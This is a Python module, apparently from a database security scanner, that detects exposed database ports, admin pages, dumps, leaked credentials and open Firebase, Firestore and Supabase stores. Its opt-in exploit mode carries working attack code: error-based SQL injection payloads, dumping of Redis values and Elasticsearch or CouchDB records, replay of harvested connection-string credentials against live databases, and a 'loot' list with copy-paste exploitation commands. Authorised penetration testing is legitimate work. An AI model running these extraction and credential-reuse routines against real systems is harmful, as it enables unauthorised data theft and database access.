def _http_get(engine: ScanEngine, path: str) -> "httpx.Response | None":
    try:
        # Shorter timeout than the default 15s: DB probes are many and a hung WAF must
        # not stall the whole audit.
        return engine.request("GET", _origin(engine) + path, timeout=6.0)
    except httpx.HTTPError:
        return None


def _baseline_catchall(engine: ScanEngine) -> bool:
    import random, string  # noqa: PLC0415
    slug = "".join(random.choices(string.ascii_lowercase, k=20))
    resp = _http_get(engine, f"/{slug}")
    return resp is not None and resp.status_code == 200


def _check_admin_interfaces(engine: ScanEngine, catch_all: bool) -> list[Finding]:
    findings: list[Finding] = []
    for path in _ADMIN_PATHS:
        resp = _http_get(engine, path)
        if resp is None:
            continue
        url = _origin(engine) + path
        if resp.status_code == 200 and not catch_all and _ADMIN_SIG.search(resp.text):
            findings.append(_f(f"Exposed DB Admin Interface [200]: {path}",
                               f"A database admin interface is publicly accessible at {url}.",
                               Severity.CRITICAL, "Remove or restrict the interface to a VPN/allowlist.",
                               "admin_200", path=path, url=url, proof_url=url))
        elif resp.status_code in (401, 403):
            findings.append(_f(f"DB Admin Interface Present (Protected) [{resp.status_code}]: {path}",
                               f"A database admin interface exists at {url} but is access-controlled.",
                               Severity.HIGH, "Remove it from the web root if not needed.",
                               "admin_403", path=path, url=url, proof_url=url))
    return findings


def _check_dump_files(engine: ScanEngine, catch_all: bool) -> list[Finding]:
    host = urlparse(engine.url).hostname or ""
    paths = list(_DUMP_PATHS) + list(_EXTRA_DUMP_PATHS)
    if host:
        paths += [f"/{host.split('.')[0]}.sql", f"/{host.split('.')[0]}.sqlite"]
    findings: list[Finding] = []
    for path in paths:
        resp = _http_get(engine, path)
        if resp is None:
            continue
        ctype = resp.headers.get("content-type", "").lower()
        looks_html = "html" in ctype or resp.text[:64].lstrip().lower().startswith(("<!doctype", "<html"))
        is_sqlite = resp.content[:16].startswith(_SQLITE_MAGIC)
        non_html_dump = "plain" in ctype or "octet-stream" in ctype or "sql" in ctype \
            or path.endswith((".gz", ".zip"))
        if resp.status_code == 200 and resp.content and not catch_all and not looks_html and \
                (non_html_dump or is_sqlite):
            url = _origin(engine) + path
            findings.append(_f(f"Exposed Database Dump [200]: {path}",
                               f"A database dump/backup is publicly downloadable at {url} "
                               f"({len(resp.content)} bytes, {ctype or 'unknown type'}).",
                               Severity.CRITICAL, "Remove the dump from the web root and rotate exposed secrets.",
                               "dump", path=path, url=url, proof_url=url))
    return findings


def _check_framework_leaks(engine: ScanEngine) -> list[Finding]:
    findings: list[Finding] = []
    for path, fw in _FRAMEWORK_PATHS:
        resp = _http_get(engine, path)
        if resp is None:
            continue
        if resp.status_code == 200 and _DB_CRED_RE.search(resp.text):
            url = _origin(engine) + path
            findings.append(_f(f"DB Credentials Leaked via {fw}: {path}",
                               f"{fw} debug endpoint {url} exposes database configuration/credentials.",
                               Severity.CRITICAL, "Disable debug/actuator endpoints in production.",
                               "unauth", path=path, url=url, framework=fw, proof_url=url))
    return findings


# ---------------------------------------------------------------------------
# Cloud / managed database exposure (Firebase, Firestore, Supabase)
# ---------------------------------------------------------------------------

def _check_cloud_db(engine: ScanEngine) -> list[Finding]:
    """Detect world-readable cloud databases referenced in the site's source."""
    try:
        blob = "\n".join(engine.get_crawl().pages.values())
    except Exception:  # noqa: BLE001
        return []
    findings: list[Finding] = []

    # --- Firebase Realtime Database: /.json with no auth returns the whole tree ---
    projects = set(_FIREBASE_RE.findall(blob)) | set(_FIREBASE_CFG_RE.findall(blob))
    for proj in list(projects)[:5]:
        url = f"https://{proj}.firebaseio.com/.json?shallow=true"
        try:
            r = engine.request("GET", url, timeout=8.0)
        except httpx.HTTPError:
            continue
        if r.status_code == 200 and r.text.strip() not in ("null", "", "{}"):
            findings.append(_f(
                f"Firebase Realtime DB World-Readable: {proj}",
                f"The Firebase Realtime Database '{proj}' is readable WITHOUT authentication at "
                f"{url} — every record can be downloaded by anyone.",
                Severity.CRITICAL,
                "Set Firebase security rules to deny public read/write and require authentication.",
                "cloud_db", url=url, project=proj, proof_url=url,
                exploit_cmd=f"curl 'https://{proj}.firebaseio.com/.json'"))

    # --- Firestore REST: open default database documents ---
    for proj in list(set(_FIRESTORE_RE.findall(blob)))[:3]:
        url = f"https://firestore.googleapis.com/v1/projects/{proj}/databases/(default)/documents"
        try:
            r = engine.request("GET", url, timeout=8.0)
        except httpx.HTTPError:
            continue
        if r.status_code == 200 and '"documents"' in r.text:
            findings.append(_f(
                f"Firestore Documents Publicly Readable: {proj}",
                f"Firestore project '{proj}' returns documents over the public REST API without "
                f"authentication ({url}).",
                Severity.CRITICAL,
                "Tighten Firestore security rules; deny unauthenticated reads.",
                "cloud_db", url=url, project=proj, proof_url=url))

    # --- Supabase: anon key in source → advisory (RLS must be enforced) ---
    sup_projects = set(_SUPABASE_RE.findall(blob))
    if sup_projects and _SUPABASE_KEY_RE.search(blob):
        proj = list(sup_projects)[0]
        findings.append(_f(
            f"Supabase Project Exposed: {proj}",
            f"A Supabase project '{proj}.supabase.co' and an anon API key are embedded in the "
            "site source. This is by design, but ONLY safe if Row-Level Security is enforced on "
            "every table — otherwise the anon key reads/writes all data.",
            Severity.MEDIUM,
            "Verify Row-Level Security is enabled and restrictive on all Supabase tables.",
            "cloud_db", project=proj, confidence="medium",
            exploit_cmd=f"curl 'https://{proj}.supabase.co/rest/v1/<table>?apikey=<anon_key>&select=*'"))
    return findings


# ---------------------------------------------------------------------------
# Active extraction (gated by --exploit) — turns detection into proof of impact
# ---------------------------------------------------------------------------

def _redis_value(host: str, port: int, key: str) -> str:
    """Best-effort read of one Redis key's value (type-aware)."""
    kb = key.encode("latin-1", "replace")
    typ = _tcp_send_recv(host, port, b"TYPE " + kb + b"\r\n")
    if b"+string" in typ:
        raw = _tcp_send_recv(host, port, b"GET " + kb + b"\r\n")
    elif b"+hash" in typ:
        raw = _tcp_send_recv(host, port, b"HGETALL " + kb + b"\r\n")
    elif b"+list" in typ:
        raw = _tcp_send_recv(host, port, b"LRANGE " + kb + b" 0 20\r\n")
    elif b"+set" in typ:
        raw = _tcp_send_recv(host, port, b"SMEMBERS " + kb + b"\r\n")
    else:
        raw = _tcp_send_recv(host, port, b"GET " + kb + b"\r\n")
    return raw.decode("latin-1", "replace")


def _exploit_redis(host: str, port: int, sample_keys: list[str], loot: Path | None) -> list[Finding]:
    """Dump sample Redis key VALUES as evidence (proof an attacker reads the data)."""
    if not sample_keys:
        return []
    dump_lines = []
    for key in sample_keys[:10]:
        val = _redis_value(host, port, key)
        dump_lines.append(f"### {key}\n{val.strip()[:500]}")
    dump = "\n\n".join(dump_lines)
    evidence = _save_evidence(loot, f"redis_{host}_{port}.txt", dump)
    return [_f(f"Redis Data Extracted: {host}:{port}",
               f"Read the actual values of {len(sample_keys[:10])} Redis key(s) without auth — "
               "concrete proof the data is fully exposed.",
               Severity.CRITICAL, "Require AUTH and firewall the port immediately.",
               "extraction", host=host, port=port, engine="Redis",
               redis_values=dump_lines[:5], evidence_file=evidence)]


def _exploit_http_json(engine: ScanEngine, label: str, url: str, host: str, port: int,
                       loot: Path | None) -> list[Finding]:
    """GET a JSON data endpoint (ES _search / CouchDB _all_docs) and save sample records."""
    try:
        r = engine.request("GET", url, timeout=8.0)
    except httpx.HTTPError:
        return []
    if r.status_code != 200 or not r.text.strip():
        return []
    evidence = _save_evidence(loot, f"{label}_{host}_{port}.json", r.text[:20000])
    return [_f(f"{label} Data Extracted: {host}:{port}",
               f"Pulled sample records from {url} without authentication.",
               Severity.CRITICAL, "Enable authentication and restrict network access.",
               "extraction", host=host, port=port, engine=label, url=url,
               evidence_file=evidence)]


def _extend_first_scheme(findings: list[Finding], engine: ScanEngine, label: str,
                         host: str, port: int, path: str, loot: Path | None) -> None:
    """Try http then https for a JSON data endpoint; append the first successful extraction."""
    for scheme in ("http", "https"):
        try:
            got = _exploit_http_json(engine, label, f"{scheme}://{host}:{port}{path}",
                                     host, port, loot)
        except Exception as exc:  # noqa: BLE001
            logger.debug(f"db_security: extract {label} {scheme} failed: {exc}")
            got = []
        if got:
            findings.extend(got)
            return


# In-band SQLi data extraction: (error-marker regex, payloads that trigger it).
_SQLI_EXTRACT = [
    (re.compile(r"~([^~]+)~"), [
        "1 AND extractvalue(1,concat(0x7e,version(),0x7e))",
        "' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -",
        "1' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -"]),
    (re.compile(r"converting the \w+ value '([^']+)", re.I), [
        "1 AND 1=convert(int,@@version)--",
        "' AND 1=convert(int,@@version)-- -"]),
    (re.compile(r"invalid input syntax for (?:type )?integer: \"([^\"]+)", re.I), [
        "1 AND 1=cast(version() as int)--",
        "' AND 1=cast(version() as int)-- -"]),
]


def _sqli_extract(inj) -> str:
    """Best-effort in-band extraction of the DB version via error-based payloads."""
    for rx, payloads in _SQLI_EXTRACT:
        for p in payloads:
            resp = inj.inject(p)
            if resp is None:
                continue
            m = rx.search(resp.text)
            if m:
                return m.group(1).strip()[:200]
    return ""


def _exploit_sqli(engine: ScanEngine, loot: Path | None) -> list[Finding]:
    """For each confirmed SQLi, attempt a lightweight in-band version pull as proof."""
    findings: list[Finding] = []
    for inj in iter_injectors(engine):
        if _sqli_one(engine, inj, safe=False) is None:
            continue
        fingerprint = _sqli_extract(inj)
        if not fingerprint:
            continue
        evidence = _save_evidence(loot, f"sqli_{inj.param}.txt",
                                  f"parameter: {inj.param}\nurl: {inj.url}\nDB version: {fingerprint}\n")
        findings.append(_f(
            f"SQLi Data Extracted (in-band): {inj.param}",
            f"Extracted the live database banner through parameter '{inj.param}' without sqlmap: "
            f"{fingerprint!r}. Full dump available via --exploit (sqlmap).",
            Severity.CRITICAL, "Use parameterised queries.",
            "extraction", parameter=inj.param, sql_fingerprint=fingerprint,
            url=inj.url, evidence_file=evidence))
    return findings


# Harvested DB credentials from connection strings: scheme://user:pass@host:port
_HARVEST_RE = re.compile(
    r"(mysql|mariadb|postgres(?:ql)?|mongodb(?:\+srv)?|redis)://([^:@/\s]+):([^@/\s]+)@"
    r"([^:/\s]+)(?::(\d+))?", re.I)


def _harvest_credentials(engine: ScanEngine) -> list[tuple]:
    """Pull (scheme, user, pass, host, port) tuples from connection strings in page source."""
    try:
        blob = "\n".join(engine.get_crawl().pages.values())
    except Exception:  # noqa: BLE001
        return []
    out, seen = [], set()
    for scheme, user, pwd, host, port in _HARVEST_RE.findall(blob):
        key = (user, pwd, host, port)
        if key in seen:
            continue
        seen.add(key)
        out.append((scheme.lower(), user, pwd, host, int(port) if port else 0))
    return out


def _try_db_login(scheme: str, user: str, pwd: str, host: str, port: int) -> bool:
    """Attempt a real connection with harvested credentials (optional drivers; graceful)."""
    try:
        if scheme.startswith(("mysql", "maria")):
            import pymysql  # type: ignore  # noqa: PLC0415
            pymysql.connect(host=host, port=port or 3306, user=user, password=pwd,
                            connect_timeout=4).close()
            return True
        if scheme.startswith("postgres"):
            import psycopg2  # type: ignore  # noqa: PLC0415
            psycopg2.connect(host=host, port=port or 5432, user=user, password=pwd,
                             connect_timeout=4).close()
            return True
        if scheme.startswith("redis"):
            resp = _tcp_send_recv(host, port or 6379, f"AUTH {user} {pwd}\r\n".encode("latin-1"))
            return b"+OK" in resp
    except ImportError:
        logger.debug(f"db_security: no driver to reuse creds for {scheme}")
    except Exception as exc:  # noqa: BLE001
        logger.debug(f"db_security: cred-reuse {scheme}://{host} failed: {exc}")
    return False


def _exploit_cred_reuse(engine: ScanEngine) -> list[Finding]:
    """Replay credentials harvested from the site against their own database hosts."""
    findings: list[Finding] = []
    for scheme, user, pwd, host, port in _harvest_credentials(engine):
        if _try_db_login(scheme, user, pwd, host, port):
            findings.append(_f(
                f"Credential Reuse — Harvested Creds Open {scheme.upper()}: {host}",
                f"Credentials leaked in the site source ({user}:***@{host}) successfully "
                f"authenticated to the live {scheme} database — full access confirmed.",
                Severity.CRITICAL,
                "Rotate the exposed credentials and remove them from client-side code.",
                "cred_reuse", host=host, port=port, engine=scheme,
                reused_credential=f"{user}:***", confidence="high"))
    return findings


# ---------------------------------------------------------------------------
# TLS on DB ports
# ---------------------------------------------------------------------------

def _check_tls(host: str, port: int) -> list[Finding]:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with socket.create_connection((host, port), timeout=4) as raw:
            with ctx.wrap_socket(raw, server_hostname=host) as tls:
                cert = tls.getpeercert(binary_form=True)
                if cert:
                    return [_f(f"DB Port TLS — Self-Signed/Unverified: {host}:{port}",
                               f"{host}:{port} offers TLS but the certificate is not trusted (self-signed).",
                               Severity.LOW, "Use a CA-signed certificate for database TLS.",
                               "tls", host=host, port=port)]
    except (ssl.SSLError, OSError):
        return [_f(f"DB Port Without Direct TLS: {host}:{port}",
                   f"{host}:{port} is open but did not complete a TLS handshake. Traffic may be "
                   "unencrypted (note: DB-native STARTTLS is not detected by this check).",
                   Severity.MEDIUM, "Enable and require TLS for database connections.",
                   "tls", host=host, port=port)]
    return []


# ---------------------------------------------------------------------------
# Exposure score
# ---------------------------------------------------------------------------

def _exposure_score(findings: list[Finding]) -> tuple[int, str]:
    seen = {f.raw.get("db_category") for f in findings}
    score = min(100, sum(pts for cat, pts in _SCORE.items() if cat in seen))
    grade = ("SECURE" if score <= 15 else "AT RISK" if score <= 40
             else "EXPOSED" if score <= 70 else "CRITICAL")
    return score, grade


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def run(engine: ScanEngine) -> list[Finding]:
    safe = is_safe_mode(engine)
    findings: list[Finding] = []

    def guard(fn, *a):
        try:
            findings.extend(fn(*a))
        except Exception as exc:  # noqa: BLE001 — one failing check must not crash db_scan
            logger.warning(f"db_security: {fn.__name__} failed: {exc}")

    if safe:
        findings.append(_f("Safe Mode Active — Destructive DB Tests Skipped",
                           "Default-credential, time-based SQLi and NoSQL tests were skipped, and the "
                           "port scan was limited to the top 5 DB ports.",
                           Severity.INFO, "Re-run without safe mode on an authorised target for the full audit.",
                           "info"))

    hostname = urlparse(engine.url).hostname or ""
    ip = _resolve(hostname)

    open_ports: list[_OpenPort] = []
    if ip:
        try:
            # If the host answers random unused ports (WAF/CDN/honeypot), every DB port
            # would look open — skip the scan instead of reporting false positives.
            if _is_accept_all(ip):
                logger.info(f"db_security: {ip} answers all ports — DB port scan skipped (accept-all)")
                findings.append(_f(f"DB Port Scan Unreliable — Host Answers All Ports ({ip})",
                                   f"{hostname} ({ip}) accepts connections on random unused ports — a "
                                   "firewall/IPS, CDN, or honeypot answers everything, so per-port DB "
                                   "results would be false positives. The port scan was skipped.",
                                   Severity.INFO,
                                   "Scan the real origin IP from an allowed network for accurate DB exposure results.",
                                   "info", host=ip))
            else:
                open_ports = _scan_ports(ip, safe, engine.threads)
        except Exception as exc:  # noqa: BLE001
            logger.warning(f"db_security: port scan failed: {exc}")

    for op in open_ports:
        findings.append(_f(f"Database Port Open: {op.port}/tcp ({op.engine})",
                           f"{op.engine} is listening on {ip}:{op.port}."
                           + (f" Version: {op.version}." if op.version else "")
                           + (f" Banner: {op.banner[:80]!r}." if op.banner else ""),
                           Severity.LOW, "Restrict the port to a private network or VPN.",
                           "open_port", host=ip, port=op.port, engine=op.engine, version=op.version))
        # Per-engine unauthenticated checks
        if op.engine == "Redis":
            guard(_check_redis, ip, op.port)
        elif op.engine == "Memcached":
            guard(_check_memcached, ip, op.port)
        elif op.engine == "Elasticsearch":
            guard(_check_elasticsearch, engine, ip, op.port)
        elif op.engine == "CouchDB":
            guard(_check_couchdb, engine, ip, op.port)
        elif op.engine == "MongoDB":
            guard(_check_mongodb, ip, op.port)
        # Default credentials (skipped in safe mode)
        if not safe and op.engine in ("MySQL/MariaDB", "PostgreSQL"):
            guard(_check_default_creds, ip, op.port, op.engine)
        # TLS
        guard(_check_tls, ip, op.port)

    # Injection surface (HTTP) — params, forms, and now headers/cookies
    guard(_check_sqli, engine, safe)
    guard(_check_injection_headers, engine, safe)   # SQLi via User-Agent/Referer/XFF/cookies
    # Skip NoSQL flagging on params already confirmed SQL-injectable (avoids double-reporting).
    sqli_params = {f.raw.get("parameter") for f in findings
                   if f.raw.get("db_category") == "sqli" and f.raw.get("parameter")}
    guard(_check_nosql, engine, safe, sqli_params)
    guard(_check_nosql_authbypass, engine, safe)     # operator-injection login bypass

    catch_all = False
    try:
        catch_all = _baseline_catchall(engine)
    except Exception:  # noqa: BLE001
        pass
    guard(_check_admin_interfaces, engine, catch_all)
    guard(_check_dump_files, engine, catch_all)
    guard(_check_framework_leaks, engine)
    guard(_check_secret_files, engine, catch_all)   # .env / database.yml / my.cnf credential leak
    guard(_check_connstrings, engine)        # hardcoded DB credentials in page/JS source
    guard(_check_graphql, engine)            # GraphQL introspection / schema disclosure
    guard(_check_cloud_db, engine)           # Firebase / Firestore / Supabase exposure

    # --- Active exploitation (opt-in via --exploit): prove impact by extracting data ---
    active = bool(getattr(engine, "exploit", False)) and not safe
    if active:
        loot = _loot_dir(engine)
        for f in list(findings):
            if f.raw.get("db_category") != "unauth":
                continue
            host, port, eng = f.raw.get("host"), f.raw.get("port"), f.raw.get("engine")
            if eng == "Redis" and f.raw.get("sample_keys") and host and port:
                guard(_exploit_redis, host, port, f.raw["sample_keys"], loot)
            elif eng == "Elasticsearch" and host and port:
                _extend_first_scheme(findings, engine, "Elasticsearch", host, port,
                                     "/_search?size=10", loot)
            elif eng == "CouchDB" and f.raw.get("databases") and host and port:
                db0 = f.raw["databases"][0]
                _extend_first_scheme(findings, engine, "CouchDB", host, port,
                                     f"/{db0}/_all_docs?include_docs=true&limit=10", loot)
        guard(_exploit_sqli, engine, loot)        # in-band SQLi version extraction
        guard(_exploit_cred_reuse, engine)        # replay harvested creds against DB hosts

    # Exposure score
    score, grade = _exposure_score(findings)
    findings.append(_f(f"DB Exposure Score: {score}/100 ({grade})",
                       f"Database exposure score is {score}/100 — grade {grade}. "
                       "Computed from open ports, unauthenticated access, SQL/NoSQL injection "
                       "(params, forms, headers/cookies, auth-bypass), cloud DB exposure, leaked "
                       "credentials, admin interfaces, dumps, and TLS posture.",
                       Severity.INFO, "", "score", score=score, grade=grade))

    findings.sort(key=lambda f: ["critical", "high", "medium", "low", "info"].index(f.severity.value))
    return findings


# ---------------------------------------------------------------------------
# Red-team attack plan + loot extraction
# ---------------------------------------------------------------------------

_SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}


def build_playbook(findings: list[Finding]) -> list[dict]:
    """Ordered, copy-paste exploitation steps assembled from confirmed DB findings.

    Each step = {severity, title, category, command}. Only findings that carry a concrete
    next-step command (sqlmap line or exploit_cmd) become steps, so the plan is actionable.
    """
    db = [f for f in findings if f.module == MODULE]
    plan: list[dict] = []
    for f in sorted(db, key=lambda x: _SEV_ORDER.get(x.severity.value, 9)):
        cmd = f.raw.get("sqlmap") or f.raw.get("exploit_cmd")
        if not cmd:
            continue
        plan.append({"severity": f.severity.value, "title": f.title,
                     "category": f.raw.get("db_category", ""), "command": cmd,
                     "attack": f.raw.get("attack", ""), "evidence": f.raw.get("evidence_file", "")})
    return plan


def collect_loot(findings: list[Finding]) -> list[str]:
    """Aggregate the data actually extracted during the audit (the 'loot' a red team keeps)."""
    db = [f for f in findings if f.module == MODULE]
    loot: list[str] = []
    for f in db:
        r = f.raw
        if r.get("sample_keys"):
            loot.append(f"Redis keys ({r.get('keys_count', '?')} total): "
                        + ", ".join(r["sample_keys"][:6]))
        if r.get("indices"):
            loot.append(f"Elasticsearch indices (~{r.get('doc_count', 0)} docs): "
                        + ", ".join(r["indices"][:6]))
        if r.get("databases"):
            loot.append("CouchDB databases: " + ", ".join(r["databases"][:6]))
        if r.get("types"):
            loot.append("GraphQL types: " + ", ".join(r["types"][:6]))
        if r.get("snippet"):
            loot.append("Leaked connection string: " + str(r["snippet"]))
        if r.get("secret_match"):
            loot.append(f"Secret in {r.get('path', 'file')}: " + str(r["secret_match"]))
        if r.get("credential"):
            loot.append(f"Default credentials {r.get('engine', '')}: " + str(r["credential"]))
        # Actively extracted evidence (--exploit mode)
        if r.get("redis_values"):
            loot.append(f"Redis values dumped ({r.get('engine', 'Redis')}): "
                        + " | ".join(str(v)[:60] for v in r["redis_values"][:3]))
        if r.get("sql_fingerprint"):
            loot.append(f"DB banner via SQLi '{r.get('parameter', '?')}': " + str(r["sql_fingerprint"]))
        if r.get("reused_credential"):
            loot.append(f"Working reused credential on {r.get('engine', '')}: " + str(r["reused_credential"]))
        if r.get("project"):
            loot.append(f"Cloud DB exposed: {r.get('project')}")
        if r.get("evidence_file"):
            loot.append(f"Evidence saved: {r['evidence_file']}")
    return loot


# ---------------------------------------------------------------------------
# Dedicated console panel (called from engine.run_scan)
# ---------------------------------------------------------------------------

_SEV_COLOR = {"critical": "bold red", "high": "bold orange3", "medium": "bold yellow",
              "low": "bold green", "info": "cyan"}
_GRADE_COLOR = {"SECURE": "bold green", "AT RISK": "bold yellow",
                "EXPOSED": "bold orange3", "CRITICAL": "bold red"}


def render_panel(findings: list[Finding]) -> None:
    """Render the dedicated Database Security Audit panel. No-op if no db findings."""
    db = [f for f in findings if f.module == MODULE]
    if not db:
        return

    from rich import box  # noqa: PLC0415
    from rich.console import Console, Group  # noqa: PLC0415
    from rich.panel import Panel  # noqa: PLC0415
    from rich.table import Table  # noqa: PLC0415
    from rich.text import Text  # noqa: PLC0415

    console = Console()
    score_f = next((f for f in db if f.raw.get("db_category") == "score"), None)
    score = int(score_f.raw.get("score", 0)) if score_f else 0
    grade = score_f.raw.get("grade", "") if score_f else ""
    gcolor = _GRADE_COLOR.get(grade, "white")

    # Per-finding lines (skip the score line itself)
    lines = Text()
    for f in db:
        if f.raw.get("db_category") == "score":
            continue
        sev = f.severity.value
        port = f.raw.get("port")
        prefix = f"[{port}] " if port else ""
        lines.append(f"  [{sev.upper():<8}] ", style=_SEV_COLOR.get(sev, "white"))
        lines.append(f"{prefix}{f.title}\n")
    if not lines.plain:
        lines.append("  No database findings.\n", style="dim")

    # Score bar
    filled = round(score / 100 * 40)
    bar = Text()
    bar.append("  DB Exposure Score  ", style="bold white")
    bar.append("█" * filled, style=gcolor)
    bar.append("░" * (40 - filled), style="bright_black")
    bar.append(f"  {score}/100  ", style="bold white")
    bar.append(grade, style=gcolor)

    # Summary table
    summ = Table(box=box.SIMPLE, show_header=True, header_style="bold bright_white", padding=(0, 2))
    for col in ("Open ports", "Auth issues", "SQLi points", "Data leaks", "Admin interfaces"):
        summ.add_column(col, justify="center")
    summ.add_row(
        str(sum(1 for f in db if f.raw.get("db_category") == "open_port")),
        str(sum(1 for f in db if f.raw.get("db_category") in ("unauth", "default_creds", "cred_reuse"))),
        str(sum(1 for f in db if f.raw.get("db_category") in ("sqli", "authbypass"))),
        str(sum(1 for f in db if f.raw.get("db_category")
                in ("creds_leak", "dump", "graphql", "cloud_db", "extraction"))),
        str(sum(1 for f in db if f.raw.get("db_category") in ("admin_200", "admin_403"))),
    )

    # Loot extracted during the audit (red-team view of stolen data)
    loot = collect_loot(db)
    loot_block = Text()
    if loot:
        loot_block.append("\n  💰 Loot extracted\n", style="bold yellow")
        for item in loot[:12]:
            loot_block.append("   • ", style="yellow")
            loot_block.append(f"{item}\n", style="white")

    # Ordered exploitation plan (copy-paste commands)
    plan = build_playbook(findings)
    plan_block = Text()
    if plan:
        plan_block.append("\n  ⚔  Attack path — exploitation commands\n", style="bold red")
        for i, step in enumerate(plan[:10], 1):
            sev = step["severity"]
            plan_block.append(f"   {i}. ", style="bold white")
            plan_block.append(f"[{sev.upper()}] ", style=_SEV_COLOR.get(sev, "white"))
            plan_block.append(f"{step['title']}", style="white")
            if step.get("attack"):
                plan_block.append(f"  ⟦{step['attack']}⟧", style="magenta")
            plan_block.append("\n")
            plan_block.append(f"      $ {step['command']}\n", style="bold cyan")
            if step.get("evidence"):
                plan_block.append(f"      ⧉ evidence: {step['evidence']}\n", style="green")

    console.print()
    console.print(Panel(Group(lines, Text(), bar, Text(), summ, loot_block, plan_block),
                        title="[bold red]🛢  Database Security Audit[/bold red]",
                        border_style=gcolor, padding=(1, 2)))
